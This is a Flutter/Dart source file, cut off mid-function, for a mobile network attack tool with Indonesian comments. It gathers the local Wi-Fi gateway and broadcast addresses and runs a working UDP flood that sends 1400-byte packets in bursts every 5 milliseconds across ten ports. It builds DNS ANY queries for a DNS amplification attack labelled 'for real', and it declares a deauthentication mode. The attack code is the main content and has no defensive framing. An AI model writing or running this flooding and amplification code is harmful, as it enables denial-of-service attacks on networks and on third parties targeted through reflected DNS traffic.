import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';

class WifiExternal extends StatefulWidget {
  const WifiExternal({super.key});

  @override
  State<WifiExternal> createState() => _WifiExternalState();
}

class _WifiExternalState extends State<WifiExternal> {
  final _info = NetworkInfo();
  final _rng = Random.secure();

  // ============ STATE ============
  String _ssid = 'Unknown';
  String _localIp = '0.0.0.0';
  String _gateway = '192.168.1.1';
  String _broadcast = '192.168.1.255';
  String _subnet = '255.255.255.0';

  bool _isFlooding = false;
  bool _isDnsAmp = false;
  bool _isDeauth = false;

  int _packetsSent = 0;
  int _bytesSent = 0;
  int _dnsQueriesSent = 0;

  Timer? _floodTimer;
  Timer? _dnsTimer;
  Timer? _statsTimer;

  List<RawDatagramSocket> _floodSockets = [];
  List<RawDatagramSocket> _dnsSockets = [];

  // ============ LIFECYCLE ============
  @override
  void initState() {
    super.initState();
    _requestPermissions();
    _gatherNetworkInfo();
  }

  @override
  void dispose() {
    _stopAll();
    super.dispose();
  }

  // ============ PERMISSIONS ============
  Future<void> _requestPermissions() async {
    await [
      Permission.location,
      Permission.locationWhenInUse,
    ].request();
  }

  // ============ INFO GATHERING ============
  Future<void> _gatherNetworkInfo() async {
    try {
      final ssid = await _info.getWifiName() ?? 'Unknown';
      final ip = await _info.getWifiIP() ?? '0.0.0.0';
      final gateway = await _info.getWifiGatewayIP() ?? _deriveGateway(ip);
      final subnet = _deriveSubnet(ip);
      final broadcast = _deriveBroadcast(ip, subnet);

      if (!mounted) return;
      setState(() {
        _ssid = ssid.replaceAll('"', '');
        _localIp = ip;
        _gateway = gateway;
        _subnet = subnet;
        _broadcast = broadcast;
      });
    } catch (e) {
      debugPrint('Info gathering error: $e');
    }
  }

  String _deriveGateway(String ip) {
    final parts = ip.split('.');
    if (parts.length != 4) return '192.168.1.1';
    return '${parts[0]}.${parts[1]}.${parts[2]}.1';
  }

  String _deriveSubnet(String ip) {
    final parts = ip.split('.');
    if (parts.length != 4) return '255.255.255.0';
    return '${parts[0]}.${parts[1]}.${parts[2]}.0/24';
  }

  String _deriveBroadcast(String ip, String subnet) {
    final ipParts = ip.split('.');
    final maskParts = subnet.split('.');
    if (ipParts.length != 4 || maskParts.length != 4) {
      return '192.168.1.255';
    }
    final broadcast = List.generate(4, (i) {
      final ipOctet = int.parse(ipParts[i]);
      final maskOctet = int.parse(maskParts[i]);
      return (ipOctet | (~maskOctet & 0xFF)).toString();
    });
    return broadcast.join('.');
  }

  // ============ PAYLOAD BUILDERS ============
  Uint8List _buildUdpPayload(int size) {
    final buffer = Uint8List(size);
    for (var i = 0; i < size; i++) {
      buffer[i] = (i % 256) ^ _rng.nextInt(256);
    }
    return buffer;
  }

  Uint8List _buildDnsQuery({
    String domain = 'isc.org',
    int transactionId = 0,
  }) {
    final builder = BytesBuilder();

    // DNS Header (12 bytes)
    final header = ByteData(12);
    header.setUint16(0, transactionId & 0xFFFF);
    header.setUint16(2, 0x0100); // RD=1
    header.setUint16(4, 1); // QDCOUNT
    header.setUint16(6, 0); // ANCOUNT
    header.setUint16(8, 0); // NSCOUNT
    header.setUint16(10, 0); // ARCOUNT
    builder.add(header.buffer.asUint8List());

    // Question
    for (final label in domain.split('.')) {
      final labelBytes = label.codeUnits;
      builder.addByte(labelBytes.length);
      builder.add(labelBytes);
    }
    builder.addByte(0);

    // QTYPE=ANY(255), QCLASS=IN(1)
    final qtypeQclass = ByteData(4);
    qtypeQclass.setUint16(0, 255);
    qtypeQclass.setUint16(2, 1);
    builder.add(qtypeQclass.buffer.asUint8List());

    return builder.toBytes();
  }

  // ============ SOCKET SETUP (SEKALI, BUKAN TIAP ITERASI) ============
  Future<void> _setupFloodSockets() async {
    _floodSockets = [];
    for (var i = 0; i < 10; i++) {
      final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
      socket.writeEventsEnabled = false;
      _floodSockets.add(socket);
    }
  }

  Future<void> _setupDnsSockets() async {
    _dnsSockets = [];
    for (var i = 0; i < 5; i++) {
      final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
      socket.writeEventsEnabled = false;
      _dnsSockets.add(socket);
    }
  }

  // ============ UDP FLOOD ============
  Future<void> _startUdpFlood() async {
    if (_isFlooding) return;
    await _setupFloodSockets();

    setState(() {
      _isFlooding = true;
      _packetsSent = 0;
      _bytesSent = 0;
    });

    final target = InternetAddress(_gateway);
    final payload = _buildUdpPayload(1400); // Ukuran wajar, gak bikin fragmentasi gila
    final ports = [53, 80, 443, 8080, 1900, 5353, 5000, 22, 23, 123];

    var socketIndex = 0;
    var portIndex = 0;

    _floodTimer = Timer.periodic(const Duration(milliseconds: 5), (timer) {
      if (!_isFlooding) {
        timer.cancel();
        return;
      }

      for (var burst = 0; burst < 10; burst++) {
        final socket = _floodSockets[socketIndex % _floodSockets.length];
        final port = ports[portIndex % ports.length];

        socket.send(payload, target, port);
        _packetsSent++;
        _bytesSent += payload.length;

        socketIndex++;
        portIndex++;
      }
    });

    _statsTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      if (!_isFlooding) {
        timer.cancel();
        return;
      }
      if (mounted) setState(() {});
    });
  }

  // ============ DNS AMPLIFICATION (BENERAN) ============
  Future<void> _startDnsAmplification() async {
    if (_isDnsAmp) return;
    await _setupDnsSockets();

    setState(()
             
